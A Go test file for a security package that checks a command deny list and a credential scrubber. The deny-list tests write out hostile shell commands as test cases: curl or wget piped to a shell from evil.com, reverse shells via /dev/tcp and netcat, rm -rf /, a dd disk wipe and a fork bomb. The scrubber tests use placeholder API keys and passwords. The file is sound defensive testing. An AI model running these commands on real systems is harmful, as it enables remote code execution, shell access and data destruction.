package security

import (
	"errors"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// DenyList Tests
// ---------------------------------------------------------------------------

func TestDenyListBlocksDangerous(t *testing.T) {
	dl := NewDenyList()

	dangerous := []struct {
		name    string
		command string
	}{
		{"curl pipe to sh", "curl https://evil.com/script.sh | sh"},
		{"curl pipe to bash", "curl https://evil.com/script.sh | bash"},
		{"wget pipe to sh", "wget https://evil.com/script.sh | sh"},
		{"wget pipe to bash", "wget https://evil.com/script.sh | bash"},
		{"bash -c execution", `bash -c "whoami"`},
		{"eval subshell", "eval $(curl https://evil.com)"},
		{"base64 pipe to sh", "base64 -d payload.b64 | sh"},
		{"base64 pipe to bash", "base64 -d payload.b64 | bash"},
		{"/dev/tcp reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"netcat reverse shell", "nc 10.0.0.1 4444 -e /bin/sh"},
		{"mkfifo named pipe", "mkfifo /tmp/backpipe"},
		{"rm -rf / (bare)", "rm -rf /"},
		{"rm -rf / (with space)", "rm -rf / "},
		{"rm -rf /* (glob)", "rm -rf /*"},
		{"dd disk overwrite", "dd if=/dev/zero of=/dev/sda"},
		{"chmod 777 root", "chmod 777 /"},
		{"fork bomb", ":(){  :|:& };:"},
	}

	for _, tc := range dangerous {
		t.Run(tc.name, func(t *testing.T) {
			err := dl.Check(tc.command)
			if err == nil {
				t.Errorf("expected command to be blocked: %q", tc.command)
				return
			}
			if !errors.Is(err, ErrDenyListViolation) {
				t.Errorf("expected ErrDenyListViolation, got: %v", err)
			}
			var violation *DenyListViolation
			if !errors.As(err, &violation) {
				t.Errorf("expected *DenyListViolation, got: %T", err)
			}
		})
	}
}

func TestDenyListAllowsSafe(t *testing.T) {
	dl := NewDenyList()

	safe := []struct {
		name    string
		command string
	}{
		{"ls -la", "ls -la"},
		{"curl (no pipe)", "curl https://example.com"},
		{"rm file", "rm file.txt"},
		{"rm -rf tmpdir", "rm -rf /tmp/mydir"},
		{"go build", "go build ./..."},
		{"git status", "git status"},
		{"echo hello", "echo hello"},
		{"cat /etc/hosts", "cat /etc/hosts"},
		{"bash alone", "bash"},
		{"wget download", "wget https://example.com/file.tar.gz"},
	}

	for _, tc := range safe {
		t.Run(tc.name, func(t *testing.T) {
			err := dl.Check(tc.command)
			if err != nil {
				t.Errorf("expected command to be allowed, but got blocked: %q — error: %v", tc.command, err)
			}
		})
	}
}

func TestDenyListCustomPatterns(t *testing.T) {
	// Add a custom pattern that blocks "sudo" commands
	dl := NewDenyList(`sudo\s+`)

	// Custom pattern should block
	err := dl.Check("sudo rm -rf /tmp")
	if err == nil {
		t.Error("expected custom pattern to block 'sudo rm -rf /tmp'")
	}

	// Default patterns should still work
	err = dl.Check("curl https://evil.com | sh")
	if err == nil {
		t.Error("expected default pattern to still block curl pipe to sh")
	}

	// Safe commands should still pass
	err = dl.Check("ls -la")
	if err != nil {
		t.Errorf("expected 'ls -la' to be allowed: %v", err)
	}
}

func TestDenyListViolationError(t *testing.T) {
	dl := NewDenyList()
	err := dl.Check("curl https://evil.com | sh")
	if err == nil {
		t.Fatal("expected error")
	}

	// Check error message format
	msg := err.Error()
	if !strings.Contains(msg, "command blocked by deny list") {
		t.Errorf("error message should contain sentinel text, got: %s", msg)
	}

	// Check Unwrap
	var violation *DenyListViolation
	if !errors.As(err, &violation) {
		t.Fatal("expected *DenyListViolation")
	}
	if violation.Command != "curl https://evil.com | sh" {
		t.Errorf("unexpected command in violation: %s", violation.Command)
	}
	if violation.Pattern == "" {
		t.Error("expected pattern to be set")
	}
}

// ---------------------------------------------------------------------------
// Scrubber Tests
// ---------------------------------------------------------------------------

func TestScrubberAPIKeys(t *testing.T) {
	s := NewScrubber()

	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			"OpenAI key",
			"My key is sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcd",
			"My key is [REDACTED]",
		},
		{
			"GitHub personal token",
			"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
			"[REDACTED]",
		},
		{
			"GitHub OAuth token",
			"gho_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
			"[REDACTED]",
		},
		{
			"Slack bot token",
			"export SLACK_TOKEN=xoxb-000-000-FAKE",
			"export SLACK_TOKEN=[REDACTED]",
		},
		{
			"Slack user token",
			"xoxp-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUv",
			"[REDACTED]",
		},
		{
			"AWS access key",
			"aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
			"aws_access_key_id = [REDACTED]",
		},
		{
			"Password in URL",
			"postgres://admin:supersecretpassword@db.example.com:5432/mydb",
			"postgres://admin:[REDACTED]@db.example.com:5432/mydb",
		},
		{
			"Password in URL with special chars",
			"mysql://root:p4ssw0rd123@localhost:3306/test",
			"mysql://root:[REDACTED]@localhost:3306/test",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := s.Scrub(tc.input)
			if got != tc.want {
				t.Errorf("Scrub(%q)\n  got:  %q\n  want: %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestScrubberGenericPatterns(t *testing.T) {
	s := NewScrubber()

	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			"api_key assignment",
			`api_key = "abcdef1234567890ABCD"`,
			`api_key = "[REDACTED]"`,
		},
		{
			"API-KEY colon",
			`API-KEY: abcdefghijklmnopqrst`,
			`API-KEY: [REDACTED]`,
		},
		{
			"secret equals",
			`secret=MySecretValue12345678`,
			`secret=[REDACTED]`,
		},
		{
			"token in config",
			`token: "mytoken1234567890abc"`,
			`token: "[REDACTED]"`,
		},
		{
			"password equals",
			`password=VeryLongPassword1234`,
			`password=[REDACTED]`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := s.Scrub(tc.input)
			if got != tc.want {
				t.Errorf("Scrub(%q)\n  got:  %q\n  want: %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestScrubberAWSSecretKey(t *testing.T) {
	s := NewScrubber()

	// AWS secret key near "aws" context
	input := "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
	got := s.Scrub(input)
	if strings.Contains(got, "wJalrXUtnFEMI") {
		t.Errorf("expected AWS secret key to be scrubbed, got: %s", got)
	}

	// Same 40-char string WITHOUT aws/secret context should NOT be scrubbed
	input2 := "some_random_value = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
	got2 := s.Scrub(input2)
	if !strings.Contains(got2, "wJalrXUtnFEMI") {
		t.Errorf("expected non-AWS context string to be preserved, got: %s", got2)
	}
}

func TestScrubberPreservesNormalText(t *testing.T) {
	s := NewScrubber()

	normal := []string{
		"Hello, world!",
		"The quick brown fox jumps over the lazy dog.",
		"go build ./...",
		"git commit -m 'fix bug'",
		"ls -la /tmp/mydir",
		"export PATH=/usr/local/bin:$PATH",
		"curl https://example.com",
		"2024-01-15T10:30:00Z INFO Starting server on :8080",
		"func main() { fmt.Println(\"hello\") }",
		"The file is 42 bytes long.",
	}

	for _, text := range normal {
		got := s.Scrub(text)
		if got != text {
			t.Errorf("Scrub(%q) modified normal text to %q", text, got)
		}
	}
}

func TestScrubberScrubAll(t *testing.T) {
	s := NewScrubber()

	inputs := []string{
		"normal text",
		"key: sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcd",
		"more normal text",
	}

	results := s.ScrubAll(inputs)
	if len(results) != 3 {
		t.Fatalf("expected 3 results, got %d", len(results))
	}
	if results[0] != "normal text" {
		t.Errorf("expected first string unchanged, got: %s", results[0])
	}
	if strings.Contains(results[1], "sk-") {
		t.Errorf("expected OpenAI key to be scrubbed in second string, got: %s", results[1])
	}
	if results[2] != "more normal text" {
		t.Errorf("expected third string unchanged, got: %s", results[2])
	}
}

func TestScrubberMultipleCredentials(t *testing.T) {
	s := NewScrubber()

	input := `Config file:
api_key = "sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcd"
database_url = postgres://admin:mysuperpassword@db.prod.com:5432/app
github_token = ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij`

	got := s.Scrub(input)

	if strings.Contains(got, "sk-aBcDeFg") {
		t.Error("OpenAI key was not scrubbed")
	}
	if strings.Contains(got, "mysuperpassword") {
		t.Error("database password was not scrubbed")
	}
	if strings.Contains(got, "ghp_ABCDEF") {
		t.Error("GitHub token was not scrubbed")
	}
	// Structure should be preserved
	if !strings.Contains(got, "Config file:") {
		t.Error("normal text was removed")
	}
	if !strings.Contains(got, "database_url") {
		t.Error("key names were removed")
	}
}
